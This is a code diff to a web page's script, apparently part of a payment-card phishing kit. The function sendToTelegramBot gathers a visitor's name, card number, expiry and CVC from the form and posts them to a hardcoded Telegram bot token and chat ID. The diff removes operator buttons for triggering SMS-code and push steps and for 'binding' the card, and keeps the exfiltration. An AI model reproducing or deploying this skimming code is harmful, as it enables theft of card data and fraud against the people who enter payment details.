@@ -1280,10 +1280,6 @@ async function sendToTelegramBot() {
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // УНИКАЛЬНЫЙ ID
-        const paymentId = Date.now() + (paymentCounter++);
-        const userId = sessionStorage.getItem('currentUserId') || 'user123';
-
         const message = `👤 Клиент:
 • Имя: ${formData.firstName || 'Тест'}
 • Фамилия: ${formData.lastName || 'Тестов'}  
@@ -1298,37 +1294,15 @@ async function sendToTelegramBot() {
         const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
         const CHAT_ID = '-1003239032658';
 
+        // ОТПРАВЛЯЕМ ТОЛЬКО ТЕКСТ БЕЗ КНОПОК!
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { 
-                                text: "📱 SMS код", 
-                                callback_data: `sms_${paymentId}_${userId}`
-                            },
-                            { 
-                                text: "🔔 Пуш", 
-                                callback_data: `push_${paymentId}_${userId}`
-                            }
-                        ],
-                        [
-                            { 
-                                text: "🔗 Привязать", 
-                                callback_data: `bind_${paymentId}_${userId}_${cardNumber}`
-                            },
-                            { 
-                                text: "❌ Неверная карта", 
-                                callback_data: `wrong_card_${paymentId}_${userId}`
-                            }
-                        ]
-                    ]
-                }
+                parse_mode: 'HTML'
+                // НИКАКИХ reply_markup!
             })
         });
 
@@ -1490,6 +1464,7 @@ async function sendToTelegramBot() {
     </script>
 </body>
 </html>
+
 
 
 
